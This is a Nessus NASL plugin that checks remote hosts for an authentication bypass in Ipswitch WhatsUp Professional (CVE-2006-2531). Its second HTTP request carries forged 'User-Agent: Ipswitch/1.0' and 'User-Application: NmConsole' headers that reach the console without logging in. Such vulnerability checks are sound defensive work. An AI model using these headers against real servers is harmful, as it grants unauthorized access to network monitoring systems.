#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  This script is released under the GNU GPL v2
#
# Changes by Tenable:
# - Revised plugin title, added OSVDB ref (1/13/2009)


include("compat.inc");

if(description)
{
 script_id(21572);
 script_version("$Revision: 1.11 $");

 script_cve_id("CVE-2006-2531");
 script_bugtraq_id(18019);
 script_xref(name:"OSVDB", value:"25839");

 script_name(english:"Ipswitch WhatsUp Professional Crafted Header Authentication Bypass");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an authentication bypass flaw." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Ipswitch WhatsUp Professional, which is
used to monitor states of applications, services and hosts. 

The version of WhatsUp Professional installed on the remote host
allows an attacker to bypass authentication with a specially-crafted
request." );
 script_set_attribute(attribute:"see_also", value:"http://www.ftusecurity.com/pub/whatsup.public.pdf" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/434247/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?7b129f42" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to WhatsUp Professional 2006.01 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
 script_summary(english:"Checks for Ipswitch WhatsUp Professional Authentication Bypass");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2006-2009 David Maciejak");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8022);
 exit(0);
}



include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8022);
if (!get_port_state(port)) exit(0);


banner = get_http_banner(port:port);
if ("Server: Ipswitch" >!< banner) exit(0);


# Send a request and make sure we're required to login.
host = get_host_name();
req = string(
  'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
  'Host: ', host, '\r\n',
  'User-Agent: ', get_kb_item("global_settings/http_user_agent"), '\r\n',
  'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
  'Accept-Language: en-us,en;q=0.5\r\n',
  'Accept-Encoding: gzip,deflate\r\n',
  'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
  'Referer: http://', host, '/\r\n',
  '\r\n'
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
if(res == NULL)exit(0);


# If so...
if ("Location: /NmConsole/Login.asp" >< res)
{
  req = string(
    'GET /NmConsole/Default.asp?bIsJavaScriptDisabled=false HTTP/1.1\r\n',
    'Host: ', host, '\r\n',
    'User-Agent: Ipswitch/1.0\r\n',
    'User-Application: NmConsole\r\n',
    'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*.*;q=0.5\r\n',
    'Accept-Language: en-us,en;q=0.5\r\n',
    'Accept-Encoding: gzip,deflate\r\n',
    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n',
    'Referer: http://', host, '/\r\n',
    '\r\n'
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if(res == NULL)exit(0);

  # There's a problem if we're now authenticated.
  if ("<title>Group Device List for" >< res) security_hole(port);
}
